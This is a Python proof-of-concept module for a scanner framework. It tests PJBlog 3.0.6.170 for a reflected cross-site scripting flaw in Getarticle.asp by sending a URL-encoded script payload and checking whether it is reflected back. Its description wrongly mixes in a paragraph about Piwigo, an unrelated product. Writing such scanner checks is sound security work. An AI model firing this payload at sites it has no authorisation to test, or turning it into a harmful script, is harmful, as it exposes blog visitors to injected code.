# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PJBlog_0102'  # 平台漏洞编号，留空
    name = 'PJBlog 3.0.6.170 /Getarticle.asp XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-12-09'  # 漏洞公布时间
    desc = '''
        Piwigo是一个基于MySQL5与PHP5开发的相册系统.提供基本的发布和管理照片功能,按多种方式浏览如类别,标签,时间等。
        PJBlog是由舜子（陈子舜，英文名字PuterJam，PJblog就是以他英文名字缩写命名的，他本人就职于腾讯公司QZONE开发组）所开发的一套开源免费的中文个人博客系统程序，采用asp+Access的技术，PJBlog同时支持简繁中文，UTF-8编码，相对于其他系统，PJBlog具有相当高的运作效能以及更新率，也支持目前Blog所使用的新技术。
        PJBlog 3.0.6.170 /Getarticle.asp XSS
        漏洞文件：Getarticle.asp 。
    '''  # 漏洞描述
    ref = 'http://sebug.net/vuldb/ssvid-11237'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PJBlog'  # 漏洞应用名称
    product_version = '3.0.6.170'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3220d4ae-f47f-42b7-a12d-0ea61e4d9023'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/Getarticle.asp?id=1&blog_postFile=x%22%20)></a>%3Cscript%3Ealert%28%22bb2%22%29%3C%2Fscript%3E&page=2'
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '<script>alert("bb2")</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
